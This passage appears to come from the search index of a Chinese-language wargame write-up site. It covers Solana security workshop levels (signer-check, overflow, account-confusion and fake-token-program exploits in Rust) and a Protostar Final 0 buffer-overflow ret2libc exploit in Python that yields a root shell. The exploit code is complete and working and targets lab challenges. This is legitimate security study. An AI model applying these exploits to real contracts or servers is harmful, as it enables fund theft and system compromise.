(), }; env . execute_as_transaction ( & [ instruction ], & [ & challenge . hacker ]). print_named ( \"Hack: hacker withdraw\" ); }","title":"Exploit"},{"location":"wargames/solana_security_workshop/#_1","text":"Calling Between Programs | Solana Docs Environment in poc_framework - Rust Option & unwrap - Rust By Example Pubkey::find_program_address - Rust","title":"\u53c2\u8003\u8d44\u6599"},{"location":"wargames/solana_security_workshop/#level-1-personal-vault","text":"\u76f8\u6bd4\u4e8e Level 0\uff0c Wallet \u79fb\u9664\u4e86 vault \uff0c\u5e76\u4fdd\u6301\u4e86\u9664 vault \u5916\u5176\u5b83\u529f\u80fd\u7684\u4e00\u81f4\u6027 1 2 3 pub struct Wallet { pub authority : Pubkey , } withdraw \u4e2d wallet_info \u3001 authority_info \u4ecd\u7136\u7531\u8c03\u7528\u8005\u63d0\u4f9b\uff0c\u4e14\u53ea\u68c0\u67e5 wallet \u7684 owner \u662f\u5426\u4e3a\u5bf9\u5e94\u7a0b\u5e8f\u4ee5\u53ca wallet \u4e2d\u5b58\u50a8\u7684 authority \u4e0e\u63d0\u4f9b\u7684 authority_info \u662f\u5426\u5339\u914d\uff0c\u5e76\u6ca1\u6709\u68c0\u67e5 authority_info \u662f\u5426\u4e3a signer 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 fn withdraw ( program_id : & Pubkey , accounts : & [ AccountInfo ], amount : u64 ) -> ProgramResult { msg ! ( \"withdraw {}\" , amount ); let account_info_iter = & mut accounts . iter (); let wallet_info = next_account_info ( account_info_iter ) ? ; let authority_info = next_account_info ( account_info_iter ) ? ; let destination_info = next_account_info ( account_info_iter ) ? ; let wallet = Wallet :: deserialize ( & mut & ( * wallet_info . data ). borrow_mut ()[ .. ]) ? ; assert_eq! ( wallet_info . owner , program_id ); assert_eq! ( wallet . authority , * authority_info . key ); if amount > ** wallet_info . lamports . borrow_mut () { return Err ( ProgramError :: InsufficientFunds ); } ** wallet_info . lamports . borrow_mut () -= amount ; ** destination_info . lamports . borrow_mut () += amount ; wallet . serialize ( & mut & mut ( * wallet_info . data ). borrow_mut ()[ .. ]) . unwrap (); Ok (()) }","title":"Level 1 - Personal Vault"},{"location":"wargames/solana_security_workshop/#exploit_1","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 fn hack ( env : & mut LocalEnvironment , challenge : & Challenge ) { let amount = env . get_account ( challenge . wallet_address ). unwrap (). lamports ; let instruction = Instruction { program_id : challenge . wallet_program , accounts : vec ! [ AccountMeta :: new ( challenge . wallet_address , false ), AccountMeta :: new ( challenge . wallet_authority , false ), AccountMeta :: new ( challenge . hacker . pubkey (), true ), AccountMeta :: new_readonly ( system_program :: id (), false ), ], data : level1 :: WalletInstruction :: Withdraw { amount }. try_to_vec (). unwrap (), }; env . execute_as_transaction ( & [ instruction ], & [ & challenge . hacker ]). print_named ( \"Hack: hacker withdraw\" ); }","title":"Exploit"},{"location":"wargames/solana_security_workshop/#level-2-secure-personal-vault","text":"\u5728 Level 1 \u7684\u57fa\u7840\u4e0a\uff0c\u4fee\u590d\u4e86 withdraw \u672a\u68c0\u67e5 signer \u7684\u95ee\u9898 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 fn withdraw ( program_id : & Pubkey , accounts : & [ AccountInfo ], amount : u64 ) -> ProgramResult { msg ! ( \"withdraw {}\" , amount ); let account_info_iter = & mut accounts . iter (); let wallet_info = next_account_info ( account_info_iter ) ? ; let authority_info = next_account_info ( account_info_iter ) ? ; let destination_info = next_account_info ( account_info_iter ) ? ; let rent_info = next_account_info ( account_info_iter ) ? ; let wallet = Wallet :: deserialize ( & mut & ( * wallet_info . data ). borrow_mut ()[ .. ]) ? ; let rent = Rent :: from_account_info ( rent_info ) ? ; assert_eq! ( wallet_info . owner , program_id ); assert_eq! ( wallet . authority , * authority_info . key ); assert! ( authority_info . is_signer , \"authority must sign!\" ); let min_balance = rent . minimum_balance ( WALLET_LEN as usize ); if min_balance + amount > ** wallet_info . lamports . borrow_mut () { return Err ( ProgramError :: InsufficientFunds ); } ** wallet_info . lamports . borrow_mut () -= amount ; ** destination_info . lamports . borrow_mut () += amount ; wallet . serialize ( & mut & mut ( * wallet_info . data ). borrow_mut ()[ .. ]) . unwrap (); Ok (()) } \u5728 debug \u6a21\u5f0f\u4e0b\u7f16\u8bd1\u7a0b\u5e8f\uff0cRust \u5c06\u5bf9\u6574\u578b\u6ea2\u51fa\u629b\u51fa\u5f02\u5e38\uff0c\u800c\u5728 release \u6a21\u5f0f\u4e0b\uff0cRust \u5c06\u8fdb\u884c two's complement wrapping \uff0c\u4ee5 u8 \u4e3a\u4f8b\uff0c\u7ed3\u679c\u7b49\u540c\u4e8e\u6a21 \\(256\\) \u53ef\u4ee5\u901a\u8fc7 amount \u4f7f wallet_info \u8d26\u6237\u4e2d\u7684 lamports \u4e0b\u6ea2\u51fa\u6765\u83b7\u53d6\u8d44\u91d1\uff0c\u5e76\u4f7f destination_info \u8d26\u6237\u4e2d\u7684 lamports \u4e0a\u6ea2\u51fa\u6765\u51cf\u5c11\u5176\u8d44\u91d1 \u53e6\u5916\u8fd8\u9700\u901a\u8fc7\u4e0a\u6ea2\u51fa\u7ed5\u8fc7\u68c0\u67e5 min_balance + amount > **wallet_info.lamports.borrow_mut() \u63a8\u8350\u4f7f\u7528 checked_sub \u3001 checked_add","title":"Level 2 - Secure Personal Vault"},{"location":"wargames/solana_security_workshop/#exploit_2","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 fn hack ( env : & mut LocalEnvironment , challenge : & Challenge ) { env . execute_as_transaction ( & [ level2 :: initialize ( challenge . wallet_program , challenge . hacker . pubkey ())], & [ & challenge . hacker ]). print_named ( \"Hacker: initialize wallet\" ); let hacker_wallet = level2 :: get_wallet_address ( challenge . hacker . pubkey (), challenge . wallet_program ); let min_balance = Rent :: default (). minimum_balance ( level2 :: WALLET_LEN as usize ); let amount = u64 :: max_value () - min_balance + 1 ; for i in 0 .. 10 { env . execute_as_transaction ( & [ Instruction { program_id : challenge . wallet_program , accounts : vec ! [ AccountMeta :: new ( hacker_wallet , false ), AccountMeta :: new ( challenge . hacker . pubkey (), true ), AccountMeta :: new ( challenge . wallet_address , false ), AccountMeta :: new_readonly ( sysvar :: rent :: id (), false ), ], data : level2 :: WalletInstruction :: Withdraw { amount : amount + i }. try_to_vec (). unwrap (), }], // \u4ea4\u6613 `recent_blockhash` \u76f8\u540c\uff0c\u56e0\u800c\u9700\u8981\u8bbe\u7f6e\u4e0d\u540c\u7684\u53c2\u6570\uff0c\u907f\u514d This transaction has already been processed & [ & challenge . hacker ]). print_named ( format! ( \"Hacker: exploit {}\" , i ). as_str ()); } env . execute_as_transaction ( & [ level2 :: withdraw ( challenge . wallet_program , challenge . hacker . pubkey (), challenge . hacker . pubkey (), env . get_account ( hacker_wallet ). unwrap (). lamports - min_balance )], & [ & challenge . hacker ]). print_named ( \"Hacker: withdraw\" ); }","title":"Exploit"},{"location":"wargames/solana_security_workshop/#_2","text":"Data Types - The Rust Programming Language anchor - How to avoid SendTransactionError \"This transaction has already been processed\" - Solana Stack Exchange","title":"\u53c2\u8003\u8d44\u6599"},{"location":"wargames/solana_security_workshop/#level-3-tip-pool","text":"\u67e5\u770b TipInstruction \uff0c\u521d\u6b65\u4e86\u89e3\u7a0b\u5e8f\u7684\u529f\u80fd\uff0c\u4efb\u4f55\u4eba\u53ef\u4ee5\u521b\u5efa TipPool \u6765\u63a5\u6536 tips\uff0c\u8d44\u91d1\u5b58\u50a8\u5728 Vault \u4e2d\uff0c withdraw \u65f6\u5c06\u4f9d\u636e TipPool \u4e2d\u5b58\u50a8\u7684 value TipInstruction 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 pub enum TipInstruction { /// Initialize a vault /// /// Passed accounts: /// /// (1) Vault account /// (2) initializer (must sign) /// (3) Rent sysvar /// (4) System Program Initialize { seed : u8 , fee : f64 , fee_recipient : Pubkey , }, /// Initialize a TipPool /// /// Passed accounts: /// /// (1) Vault account /// (2) withdraw_authority (must sign) /// (3) Pool account CreatePool , /// Tip /// /// Passed accounts: /// /// (1) Vault account /// (2) Pool /// (3) Tip Source /// (4) System program Tip { amount : u64 }, /// Withdraw from Pool /// /// Passed accounts: /// /// (1) Vault account /// (2) Pool account /// (3) withdraw_authority (must sign) Withdraw { amount : u64 }, } \u4e24\u79cd\u8d26\u6237\u7c7b\u578b\uff0c Vault \u548c TipPool \uff0c\u6ce8\u610f\u5230 Vault \u7684\u5b57\u6bb5\u6070\u597d\u80fd\u8986\u76d6 TipPool \u7684\u5b57\u6bb5 deserialize \u6839\u636e\u7ed9\u5b9a\u6570\u636e\u7c7b\u578b\u89e3\u6790\uff0c\u5e76\u66f4\u65b0 buffer\uff0c\u4f7f\u5176\u6307\u5411\u5269\u4f59\u5b57\u8282 1 2 3 4 5 6 7 8 9 10 11 12 pub struct TipPool { pub withdraw_authority : Pubkey , // Vault::creator pub value : u64 , // Vault::fee pub vault : Pubkey , // Vault::fee_recipient } pub struct Vault { pub creator : Pubkey , pub fee : f64 , pub fee_recipient : Pubkey , pub seed : u8 , } withdraw \u4e2d\u672a\u68c0\u67e5 pool_info \u662f\u5426\u662f TipPool \u7c7b\u578b\u7684\u6570\u636e\uff0c\u56e0\u800c\u53ef\u4ee5\u4f20\u5165 Vault \u7c7b\u578b\u7684\u6570\u636e 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 fn withdraw ( program_id : & Pubkey , accounts : & [ AccountInfo ], amount : u64 ) -> ProgramResult { let account_info_iter = & mut accounts . iter (); let vault_info = next_account_info ( account_info_iter ) ? ; let pool_info = next_account_info ( account_info_iter ) ? ; let withdraw_authority_info = next_account_info ( account_info_iter ) ? ; let mut pool = TipPool :: deserialize ( & mut & ( * pool_info . data ). borrow_mut ()[ .. ]) ? ; assert_eq! ( vault_info . owner , program_id ); assert_eq! ( pool_info . owner , program_id ); assert! ( withdraw_authority_info . is_signer , \"withdraw authority must sign\" ); assert_eq! ( pool . vault , * vault_info . key ); assert_eq! ( * withdraw_authority_info . key , pool . withdraw_authority ); pool . value = match pool . value . checked_sub ( amount ) { Some ( v ) => v , None => return Err ( ProgramError :: InvalidArgument ), }; ** ( * vault_info ). lamports . borrow_mut () -= amount ; ** ( * withdraw_authority_info ). lamports . borrow_mut () += amount ; pool . serialize ( & mut & mut pool_info . data . borrow_mut ()[ .. ]). unwrap (); Ok (()) } \u901a\u8fc7 initialize \u6765\u63a7\u5236 Vault \u7c7b\u578b\u8d26\u6237\u5404\u4e2a\u5b57\u6bb5\u7684\u503c\uff0c\u5e76\u4f7f\u7528 Vault \u7c7b\u578b\u7684\u8d26\u6237\u6765\u4ee3\u66ff TipPool \u8fdb\u884c withdraw 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 fn initialize ( program_id : & Pubkey , accounts : & [ AccountInfo ], seed : u8 , fee : f64 , fee_recipient : Pubkey , ) -> ProgramResult { let account_info_iter = & mut accounts . iter (); let vault_info = next_account_info ( account_info_iter ) ? ; let initializer_info = next_account_info ( account_info_iter ) ? ; let rent_info = next_account_info ( account_info_iter ) ? ; let rent = Rent :: from_account_info ( rent_info ) ? ; // \u4f7f\u7528\u4e0d\u540c\u7684 seed \u6765\u83b7\u53d6\u4e0d\u540c\u7684 vault_address let vault_address = Pubkey :: create_program_address ( & [ & [ seed ]], program_id ). unwrap (); assert_eq! ( * vault_info . key , vault_address ); assert! ( vault_info . data_is_empty (), \"vault info must be empty account!\" ); assert! ( initializer_info . is_signer , \"initializer must sign!\" ); invoke_signed ( & system_instruction :: create_account ( & initializer_info . key , & vault_address , rent . minimum_balance ( VAULT_LEN as usize ), VAULT_LEN , & program_id , ), & [ initializer_info . clone (), vault_info . clone ()], & [ & [ & [ seed ]]], ) ? ; let vault = Vault { creator : * initializer_info . key , fee , fee_recipient , seed , }; vault . serialize ( & mut & mut vault_info . data . borrow_mut ()[ .. ]). unwrap (); Ok (()) } \u53ef\u589e\u52a0\u7c7b\u578b\u5b57\u6bb5\u6765\u907f\u514d Account Confusion 1 2 3 4 5 6 7 // e.g. pub struct TipPool { pub atype : u8 , // contain a unique identifier for this account type pub withdraw_authority : Pubkey , pub value : u64 , pub vault : Pubkey , }","title":"Level 3 - Tip Pool"},{"location":"wargames/solana_security_workshop/#exploit_3","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 fn hack ( env : & mut LocalEnvironment , challenge : & Challenge ) { let pool : TipPool = env . get_deserialized_account ( challenge . tip_pool ). unwrap (); let seed = 1 ; let hacker_vault = Pubkey :: create_program_address ( & [ & [ seed ]], & challenge . tip_program ). unwrap (); env . execute_as_transaction ( & [ level3 :: initialize ( challenge . tip_program , hacker_vault , // new vault challenge . hacker . pubkey (), // creator <-> withdraw_authority seed , pool . value as f64 , // fee <-> value challenge . vault_address // fee_recipient <-> vault )], & [ & challenge . hacker ], ). print_named ( \"Hacker: initialize vault\" ); env . execute_as_transaction ( & [ level3 :: withdraw ( challenge . tip_program , challenge . vault_address , hacker_vault , challenge . hacker . pubkey (), pool . value , )], & [ & challenge . hacker ] ). print_named ( \"Hacker: withdraw\" ); }","title":"Exploit"},{"location":"wargames/solana_security_workshop/#_3","text":"Solana Smart Contracts: Common Pitfalls and How to Avoid Them BorshDeserialize in borsh::de - Rust Program Derived Addresses (PDAs) | Solana Cookbook","title":"\u53c2\u8003\u8d44\u6599"},{"location":"wargames/solana_security_workshop/#level-4-spl-token-vault","text":"\u6bcf\u4e00\u79cd\u7c7b\u578b\u7684 SPL \u4ee3\u5e01\u901a\u8fc7\u521b\u5efa\u4e00\u4e2a mint \u8d26\u6237\u6765\u58f0\u660e\uff0c mint \u8d26\u6237\u5b58\u50a8\u4ee3\u5e01\u5143\u6570\u636e\uff0c\u6bcf\u4e2a SPL \u4ee3\u5e01\u8d26\u6237\u5173\u8054 mint \u8d26\u6237 Associated Token Account Program \u6839\u636e\u7528\u6237\u7cfb\u7edf\u8d26\u6237\u548c mint \u8d26\u6237\u786e\u5b9a\u6027\u5730\u6d3e\u751f SPL \u4ee3\u5e01\u8d26\u6237\u3002\u65e0\u8bba\u521b\u5efa\u8005\uff0c create_associated_token_account \u7684\u6240\u6709\u8005\u90fd\u662f\u5bf9\u5e94\u7528\u6237\u7684\u7cfb\u7edf\u8d26\u6237 \u82e5 SPL \u4ee3\u5e01\u8d26\u6237\u5173\u8054\u539f\u751f mint \uff08SOL\uff09\uff0c\u5219\u8d26\u6237 SOL \u4f59\u989d\u4e0e\u4ee3\u5e01\u4f59\u989d\u4fdd\u6301\u4e00\u81f4 spl_token \u5728\u7248\u672c 3.1.1 \u6709\u91cd\u8981\u53d8\u66f4 \ud83d\udc40 1 2 3 // There's a mitigation for this bug in spl-token 3.1.1 // vendored_spl_token is an exact copy of spl-token 3.1.0, which doesn't have the mitigation yet use vendored_spl_token as spl_token ; \u5bf9\u6bd4 3.1.1 \u548c 3.1.0 \u7684\u6e90\u7801 2 \uff0c\u53d1\u73b0\u7248\u672c 3.1.1 \u4e3b\u8981\u65b0\u589e\u4e86\u5bf9\u63d0\u4f9b\u7684 SPL \u4ee3\u5e01\u7a0b\u5e8f ID \u7684\u68c0\u67e5 check_program_account(token_program_id)?; \uff0c\u800c token_program_id \u662f\u53ef\u63a7\u7684\uff0c\u90a3\u4e48\u5728\u7248\u672c 3.1.0 \u53ef\u4ee5\u90e8\u7f72\u6076\u610f\u7a0b\u5e8f\u6765\u64cd\u63a7\u6570\u636e \u7531 wallet_owner \u7684\u516c\u94a5\u548c wallet_program \u83b7\u5f97\u7a0b\u5e8f\u6d3e\u751f\u5730\u5740 wallet_address \uff0c\u662f\u6301\u6709 SPL \u4ee3\u5e01\u7684\u8d26\u6237\u5730\u5740 withdraw() \u4e2d\u8c03\u7528\u4e86 spl_token::instruction::transfer_checked() \uff0c\u90a3\u4e48\u5c06 spl_token \u6307\u5411\u53ef\u63a7\u7a0b\u5e8f\uff0c\u4ece\u800c\u80fd\u591f\u4ea4\u6362 source \u548c destination 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 fn withdraw ( program_id : & Pubkey , accounts : & [ AccountInfo ], amount : u64 ) -> ProgramResult { msg ! ( \"withdraw {}\" , amount ); let account_info_iter = & mut accounts . iter (); let wallet_info = next_account_info ( account_info_iter ) ? ; let authority_info = next_account_info ( account_info_iter ) ? ; let owner_info = next_account_info ( account_info_iter ) ? ; let destination_info = next_account_info ( account_info_iter ) ? ; let mint = next_account_info ( account_info_iter ) ? ; let spl_token = next_account_info ( account_info_iter ) ? ; let ( wallet_address , _ ) = get_wallet_address ( owner_info . key , program_id ); let ( authority_address , authority_seed ) = get_authority ( program_id ); assert_eq! ( wallet_info . key , & wallet_address ); assert_eq! ( authority_info . key , & authority_address ); assert! ( owner_info . is_signer , \"owner must sign!\" ); let decimals = mint . data . borrow ()[ 44 ]; invoke_signed ( & spl_token :: instruction :: transfer_checked ( & spl_token . key , & wallet_info . key , mint . key , destination_info . key , authority_info . key , & [], // signer_pubkeys amount , decimals , ). unwrap (), & [ wallet_info . clone (), destination_info . clone (), authority_info . clone (), mint . clone (), ], & [ & [ & [ authority_seed ]]], // \u5f53 signer_pubkeys \u4e3a\u7a7a\u65f6\uff0c\u7531 authority \u7b7e\u540d // \u6839\u636e bump seed \u6d3e\u751f\u51fa\u7684 account_info \u4e2d\u7684\u8d26\u6237\u4f5c\u4e3a signer ) ? ; Ok (()) }","title":"Level 4 - SPL-Token Vault"},{"location":"wargames/solana_security_workshop/#exploit_4","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 // pocs/src/bin/level4.rs fn hack ( env : & mut LocalEnvironment , challenge : & Challenge ) { let fake_spl_token_program = env . deploy_program ( \"target/deploy/level4_poc_contract.so\" ); let hacker_wallet = level4 :: get_wallet_address ( & challenge . hacker . pubkey (), & challenge . wallet_program ). 0 ; assert_tx_success ( env . execute_as_transaction ( & [ level4 :: initialize ( challenge . wallet_program , challenge . hacker . pubkey (), challenge . mint )], & [ & challenge . hacker ] )); env . execute_as_transaction ( & [ Instruction { program_id : challenge . wallet_program , accounts : vec ! [ AccountMeta :: new ( hacker_wallet , false ), // wallet_info AccountMeta :: new_readonly ( level4 :: get_authority ( & challenge . wallet_program ). 0 , false ), // authority_info AccountMeta :: new_readonly ( challenge . hacker . pubkey (), true ), // owner_info AccountMeta :: new ( challenge . wallet_address , false ), // destination_info AccountMeta :: new_readonly ( spl_token :: id (), false ), // mint // All the accounts that fake_spl_token_program::TransferChecked needs need to be // included, including the spl_token program being invoked. Since mint is not required // by spl_token::instruction::transfer, we use mint to include spl_token::id() AccountMeta :: new_readonly ( fake_spl_token_program , false ), // spl_token ], data : level4 :: WalletInstruction :: Withdraw { amount : sol_to_lamports ( 1_000_000.0 ) }. try_to_vec (). unwrap (), }], & [ & challenge . hacker ] ). print_named ( \"Hacker: withdraw\" ); } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 // level4-poc-contract/src/lib.rs use solana_program ::{ account_info :: AccountInfo , entrypoint , entrypoint :: ProgramResult , program :: invoke , pubkey :: Pubkey , }; use spl_token :: instruction ::{ TokenInstruction , transfer }; entrypoint ! ( process_instruction ); pub fn process_instruction ( _program_id : & Pubkey , accounts : & [ AccountInfo ], instruction_data : & [ u8 ], ) -> ProgramResult { match TokenInstruction :: unpack ( instruction_data ). unwrap () { TokenInstruction :: TransferChecked { amount , .. } => { let source = & accounts [ 0 ]; let mint = & accounts [ 1 ]; let destination = & accounts [ 2 ]; let authority = & accounts [ 3 ]; invoke ( & transfer ( mint . key , // token_program_id destination . key , // source_pubkey source . key , // destination_pubkey authority . key , // It's already signed by the wallet program, so `invoke` is used & [], amount , ). unwrap (), // Order doesn't matter & [ source . clone (), destination . clone (), authority . clone (), ], ) } _ => Ok (()) } }","title":"Exploit"},{"location":"wargames/solana_security_workshop/#_4","text":"Supporting the SPL Token Standard Associated Token Account Program | Solana Program Library Docs TokenInstruction in spl_token::instruction - Rust spl_token::instruction - Rust instruction.rs - source invoke_signed in solana_sdk::program - Rust Program examples written in Rust Solana Program Library \u21a9 https://github.com/solana-labs/solana-program-library/compare/token-v3.1.0...token-v3.1.1?diff=unified \u21a9","title":"\u53c2\u8003\u8d44\u6599"},{"location":"wargames/protostar/final/","text":"The levels to be exploited can be found in the /opt/protostar/bin directory. The /proc/sys/kernel/core_pattern is set to /tmp/core.%s.%e.%p. Final 0 \u00b6 You may wish to use a toupper() proof shellcode 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 #include \"../common/common.c\" #define NAME \"final0\" #define UID 0 #define GID 0 #define PORT 2995 /* * Read the username in from the network */ char * get_username () { char buffer [ 512 ]; char * q ; int i ; memset ( buffer , 0 , sizeof ( buffer )); gets ( buffer ); // reads a line from stdin into the buffer until either a terminating newline or EOF, which it replaces with '\\0' /* Strip off trailing new line characters */ q = strchr ( buffer , '\\n' ); if ( q ) * q = 0 ; q = strchr ( buffer , '\\r' ); if ( q ) * q = 0 ; /* Convert to lower case */ for ( i = 0 ; i < strlen ( buffer ); i ++ ) { buffer [ i ] = toupper ( buffer [ i ]); } /* Duplicate the string and return it */ return strdup ( buffer ); } int main ( int argc , char ** argv , char ** envp ) { int fd ; char * username ; /* Run the process as a daemon */ background_process ( NAME , UID , GID ); /* Wait for socket activity and return */ fd = serve_forever ( PORT ); /* Set the client socket to STDIN, STDOUT, and STDERR */ set_io ( fd ); username = get_username (); printf ( \"No such user %s \\n \" , username ); } gets \u4e0d\u5904\u7406 \\0 \uff0c\u800c strlen \u901a\u8fc7 \\0 \u6765\u8ba1\u7b97\u5b57\u7b26\u4e32\u7684\u957f\u5ea6\uff0c\u56e0\u6b64\u53ef\u4ee5\u901a\u8fc7\u524d\u7f6e \\0 \u6765\u7ed5\u8fc7 toupper Core files will be in /tmp \u6838\u5fc3\u8f6c\u50a8\u6587\u4ef6\uff08 man core \uff09 The default action of certain signals is to cause a process to terminate and produce a core dump file, a disk file containing an image of the process's memory at the time of termination. \u5e38\u89c1 Signal \u5982\u4e0b Signal Action Comment SIGINT Term Interrupt from keyboard SIGILL Core Illegal Instruction SIGSEGV Core Invalid memory reference \u9996\u5148\u901a\u8fc7\u7f13\u51b2\u533a\u6ea2\u51fa\u6765\u83b7\u5f97\u6838\u5fc3\u8f6c\u50a8\u6587\u4ef6\u7528\u4e8e\u8c03\u8bd5\u5e76\u786e\u5b9a\u6ea2\u51fa\u70b9 1 2 3 4 5 6 7 8 $ python -c \"print 'a'*512 + '\\x00'*4 + 'aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllll'\" | nc localhost 2995 $ ls /tmp/core* /tmp/core.11.final0.18906 $ su root # gdb final0 /tmp/core.11.final0.18906 Core was generated by ` /opt/protostar/bin/final0 ` . Program terminated with signal 11 , Segmentation fault. #0 0x65656565 in ?? () # eeee \u4e5f\u53ef\u4ee5\u901a\u8fc7\u8fdb\u7a0b\u8c03\u8bd5 1 2 3 4 5 6 7 8 9 10 11 12 13 # gdb -p `pidof final0` accept () at ../sysdeps/unix/sysv/linux/i386/socket.S:64 64 in ../sysdeps/unix/sysv/linux/i386/socket.S ( gdb ) set follow-fork-mode child # \u8ddf\u8e2a\u5b50\u8fdb\u7a0b Current language: auto The current source language is \"auto; currently asm\" . ( gdb ) c Continuing. [ New process 19058 ] # another terminal sends the payload Program received signal SIGSEGV, Segmentation fault. [ Switching to process 19058 ] 0x65656565 in ?? () \u67e5\u770b ret2libc \u51fd\u6570\u5730\u5740 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 # gdb -p `pidof final0` accept () at ../sysdeps/unix/sysv/linux/i386/socket.S:64 64 in ../sysdeps/unix/sysv/linux/i386/socket.S ( gdb ) info functions @plt All functions matching regular expression \"@plt\" : Non-debugging symbols: 0x080489fc __errno_location@plt 0x08048a0c srand@plt 0x08048a1c open@plt ... 0x08048c0c execve@plt ... 0xb7fe380c ___tls_get_addr@plt 0xb7fe381c free@plt Current language: auto The current source language is \"auto; currently asm\" . \u89c2\u5bdf\u5982\u4f55\u6784\u9020\u6808\u6765\u6b63\u786e\u5730\u8c03\u7528 execve() 1 2 3 4 5 void main () { execve ( \"/bin/sh\" , 0 , 0 ); // int execve(const char *filename, char *const argv[], char *const envp[]); // no arguments and environment variables } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 $ gcc execve_example.c -o execve_example $ gdb ./execve_example ( gdb ) set disassembly-flavor intel ( gdb ) disassemble main Dump of assembler code for function main: 0x080483c4 <main+0>: push ebp 0x080483c5 <main+1>: mov ebp,esp 0x080483c7 <main+3>: and esp,0xfffffff0 0x080483ca <main+6>: sub esp,0x10 0x080483cd <main+9>: mov DWORD PTR [ esp+0x8 ] ,0x0 0x080483d5 <main+17>: mov DWORD PTR [ esp+0x4 ] ,0x0 0x080483dd <main+25>: mov DWORD PTR [ esp ] ,0x80484b0 0x080483e4 <main+32>: call 0x80482fc <execve@plt> 0x080483e9 <main+37>: leave 0x080483ea <main+38>: ret End of assembler dump. ( gdb ) break *0x080483e4 Breakpoint 1 at 0x80483e4 ( gdb ) r Starting program: /tmp/execve_example Breakpoint 1 , 0x080483e4 in main () ( gdb ) si 0x080482fc in execve@plt () ( gdb ) x/8wx $esp 0xbffff69c: 0x080483e9 0x080484b0 0x00000000 0x00000000 0xbffff6ac: 0xb7fd7ff4 0x08048400 0x00000000 0xbffff738 ( gdb ) x/2i 0x080483e9 0x80483e9 <main+37>: leave 0x80483ea <main+38>: ret ( gdb ) x/s 0x080484b0 0x80484b0: \"/bin/sh\" \u83b7\u53d6 /bin/sh \u5728 libc \u4e2d\u7684\u504f\u79fb 1 2 3 4 5 6 7 8 9 $ ldd execve_example # get paths to all loaded libraries linux-gate.so.1 = > ( 0xb7fe4000 ) libc.so.6 = > /lib/libc.so.6 ( 0xb7e99000 ) /lib/ld-linux.so.2 ( 0xb7fe5000 ) $ grep -a -b -o /bin/sh /lib/libc.so.6 1176511 :/bin/sh # -a, --text equivalent to --binary-files=text # -b, --byte-offset print the byte offset with output lines # -o, --only-matching show only the part of a line matching PATTERN \u67e5\u770b libc \u7684\u8d77\u59cb\u5730\u5740 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 # pidof final0 1514 # cat /proc/1514/maps 08048000 -0804a000 r-xp 00000000 00 :10 2220 /opt/protostar/bin/final0 0804a000-0804b000 rwxp 00001000 00 :10 2220 /opt/protostar/bin/final0 b7e96000-b7e97000 rwxp 00000000 00 :00 0 b7e97000-b7fd5000 r-xp 00000000 00 :10 759 /lib/libc-2.11.2.so b7fd5000-b7fd6000 ---p 0013e000 00 :10 759 /lib/libc-2.11.2.so b7fd6000-b7fd8000 r-xp 0013e000 00 :10 759 /lib/libc-2.11.2.so b7fd8000-b7fd9000 rwxp 00140000 00 :10 759 /lib/libc-2.11.2.so b7fd9000-b7fdc000 rwxp 00000000 00 :00 0 b7fe0000-b7fe2000 rwxp 00000000 00 :00 0 b7fe2000-b7fe3000 r-xp 00000000 00 :00 0 [ vdso ] b7fe3000-b7ffe000 r-xp 00000000 00 :10 741 /lib/ld-2.11.2.so b7ffe000-b7fff000 r-xp 0001a000 00 :10 741 /lib/ld-2.11.2.so b7fff000-b8000000 rwxp 0001b000 00 :10 741 /lib/ld-2.11.2.so bffeb000-c0000000 rwxp 00000000 00 :00 0 [ stack ] Exploit \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 import struct , socket , telnetlib padding = 'a' * 512 + ' \\x00 ' * 4 + 'aaaabbbbccccdddd' s = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ) s . connect (( 'localhost' , 2995 )) execve = struct . pack ( '<I' , 0x08048c0c ) binsh = struct . pack ( '<I' , 1176511 + 0xb7e97000 ) exploit = padding + execve + 'RETA' + binsh + ' \\x00 ' * 8 s . send ( exploit + ' \\n ' ) t = telnetlib . Telnet () t . sock = s t . interact () # \u4f7f\u7528 telnetlib \u5207\u6362\u5230\u4ea4\u4e92\u6a21\u5f0f 1 2 3 4 5 6 7 $ python final.py id uid = 0 ( root ) gid = 0 ( root ) groups = 0 ( root ) whoami root exit *** Connection closed by remote host *** Final 1 \u00b6 The \u2018already written\u2019 bytes can be variable, and is based upon the length of the IP address and port number. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 #include \"../common/common.c\" #include <syslog.h> #define NAME \"final1\" #define UID 0 #define GID 0 #define PORT 2994 char username [ 128 ]; char hostname 